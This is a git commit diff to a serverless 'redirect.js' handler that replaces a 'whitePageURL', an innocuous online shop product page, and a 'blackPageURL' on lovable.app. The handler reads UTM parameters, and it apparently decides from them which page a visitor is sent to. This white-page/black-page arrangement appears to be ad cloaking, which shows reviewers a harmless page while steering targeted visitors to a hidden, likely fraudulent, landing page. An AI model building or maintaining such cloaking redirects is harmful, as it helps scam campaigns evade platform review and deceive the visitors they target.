33f5a024fb08dd703bd2a7485ab7c43a203e60bf
abdullahch3332 <abdullahch3332@gmail.com>
2025-11-17 16:23:46 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://999.com.pk/collections/suits/products/straight-fit-suit-blazer-navy-blue?variant=43929743982729";
-    const blackPageURL = "https://msgurupml.lovable.app/?";
+    const whitePageURL = "https://atrangistudio.com/products/marigold-yellow-wooden-wall-frame";
+    const blackPageURL = "https://halowcshpp.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
